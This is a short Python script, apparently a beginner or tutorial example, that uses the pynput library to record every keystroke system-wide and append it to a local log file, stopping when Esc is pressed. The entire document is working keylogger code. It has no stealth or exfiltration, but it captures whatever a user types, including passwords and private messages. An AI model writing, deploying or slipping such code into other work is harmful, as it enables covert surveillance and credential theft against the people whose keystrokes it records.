from pynput import keyboard

#File to save the logged keys
log_file = "key_logger.txt"

def on_press(key):
    try:
        with open(log_file,"a") as f:
            #write the key pressed to the file
            f.write(f"{key.char}")
    except AttributeError:
        #handle special keys(like space,enter, e.t.c)
        with open(log_file,"a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    #Stop the keylogger if 'esc' key is pressed.
    if key == keyboard.Key.esc:
        return False
    
#Start listening to keystrokes
with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()                
                